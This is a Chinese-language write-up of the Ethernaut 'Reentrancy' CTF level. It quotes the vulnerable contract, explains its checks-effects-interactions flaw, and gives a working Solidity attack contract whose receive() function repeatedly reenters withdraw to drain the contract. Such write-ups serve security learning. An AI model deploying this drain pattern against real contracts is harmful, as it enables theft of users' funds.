# 10-Reentrancy

# 问题描述

The goal of this level is for you to steal all the funds from the contract.

Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.
- See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

# 代码分析

很明显的Re-entrancy漏洞，起码看到这些个特征之后，第一反应就是Re-entrancy

1. 有`withdraw`函数，也就是`push-over-pull`了
2. `withdraw`函数没有follow CEI，在执行完转发eth的代码之后，最后才进行balance的更新

# 攻击思路

1. 写一个AttackReentrance合约
2. 用攻击合约去call `withdraw`函数，函数在执行完`(bool result,) = msg.sender.call{value: _amount}("");` ，由于攻击函数通过call收到了eth，因此会调用攻击函数的`receive`函数或者`fallback`函数（如果没有`receive`函数），这些函数式我们可以自定义的
3. 我们可以在这些函数中自定义去调用reentrance合约的`withdraw`，这样就产生了一个循环，由于balance是在最后才更新的（也就是循环之外），所以`balances[msg.sender] >= _amount`一定是一直成立的，直到钱被提光，无法再继续提取，返回错误，循环才会终止

## 攻击代码

建议复习一下最下面小白的一些思考和小白的一些思考2

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract AttackReentrance {
    IReentrance victim;

    constructor(address _victim) {
        victim = IReentrance(_victim);
    }

    function attack() external payable {
        victim.donate{value: msg.value}(address(this));
        victim.withdraw(msg.value);
    }

    receive() external payable {
        if (address(victim).balance >= 0.001 ether) {
            victim.withdraw(0.001 ether);
        }
    }
}
```

# 小白的一些思考

刚开始自己先写了一个代码，然后问了chatgpt，给我提了一些意见

这些意见其实非常宝贵，因为基本上能看了，但是码代码的能力还是弱了一些

```solidity
contract AttackReentrance {
    Reentrance victim;

    constructor(address _victim) {
        victim = _victim;
        victim.donate(){value: 1 ether};
        victim.withdraw(1 ether);
    }

    receive() public payable{
        victim.withdraw(1 ether);
    }
}
```

1. **构造函数中的donate调用：**
    1. 在构造函数中，你调用了victim.donate(){value: 1 ether};，但由于缺少payable关键字，这个调用会失败。应该在调用时指定payable关键字以确保可以发送ETH。
    2. **构造函数**：将payable关键字加到构造函数中，这样在部署时可以发送1 ETH。
2. **构造函数中直接调用withdraw：**
    1. 合约一部署时会立即调用withdraw，这可能会在ETH实际转移到合约之前执行，导致调用失败。通常，建议先分开执行donate和withdraw来确保部署后有足够时间完成交易。
3. **receive函数**：在receive函数中，增加了一个检查，确保合约的余额大于0才继续调用withdraw，避免死循环。

两个函数一对比，记住自己的不足，然后好好学习开发

# 小白的思考2（划重点）

在按照学来的思路进行攻击的时候遇到两个问题

- 原来合约代码的solidity版本比较低，编译有问题
    - 题目里面是`0.6.12`，比较古早
- 代码里面应用的safemath中的openzeppelin contract带有06，编译器不是很认识
    - `import "openzeppelin-contracts-06/math/SafeMath.sol";`

要解决上面两个问题也不是不可以，但是比较麻烦，且没有必要，学了一招，直接写interface即可。也就是说调用函数的sig能够对上就好了。

```solidity
interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}
```

# 小白学到的东西3

攻击的时候，尽量在攻击代码里面使用msg.value，而不是一个magic number固定的值，不然要有可能会导致gas不够，交易失败